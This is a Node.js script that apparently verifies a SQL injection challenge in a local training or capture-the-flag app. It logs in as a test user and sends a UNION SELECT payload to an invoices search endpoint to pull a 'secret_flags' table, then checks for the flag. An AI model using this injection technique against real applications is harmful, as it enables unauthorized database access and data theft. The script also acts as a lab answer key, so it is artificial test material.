#!/usr/bin/env node
/** V2.2 SQLi — UNION extract secret_flags */
import { extractFlag } from '../../../packages/shared/dist/index.js';

function arg(name, fallback) {
  const i = process.argv.indexOf(`--${name}`);
  return i >= 0 ? process.argv[i + 1] : fallback;
}

const base = arg('base', 'http://127.0.0.1:3011').replace(/\/$/, '');

const login = await fetch(`${base}/api/login`, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ username: 'alice', password: 'alice123' }),
}).then((r) => r.json());

const q = "' UNION SELECT id, name, 0, 'open', value FROM secret_flags--";
const url = `${base}/api/invoices?q=${encodeURIComponent(q)}`;
const res = await fetch(url, {
  headers: { Authorization: `Bearer ${login.token}` },
});
const text = await res.text();
console.log('status', res.status);
console.log(text.slice(0, 400));
let flag = null;
try {
  const data = JSON.parse(text);
  const row = data.invoices?.find((i) => i.title === 'sqli_flag' || i.memo?.includes('a202'));
  flag = row ? extractFlag(JSON.stringify(row)) : null;
} catch {
  /* ignore */
}
if (!flag) flag = extractFlag(text);
// Prefer the secret_flags value when multiple TRN{} appear
const all = text.match(/TRN\{[0-9a-f]{32}\}/g) || [];
const sqliFlag = all.find((f) => f.includes('a202'));
if (sqliFlag) flag = sqliFlag;
if (!flag || !flag.includes('a202')) {
  console.error('FAIL: SQLi did not return secret_flags flag');
  process.exit(1);
}
console.log('FLAG', flag);
console.log('PASS V2.2 SQLi');
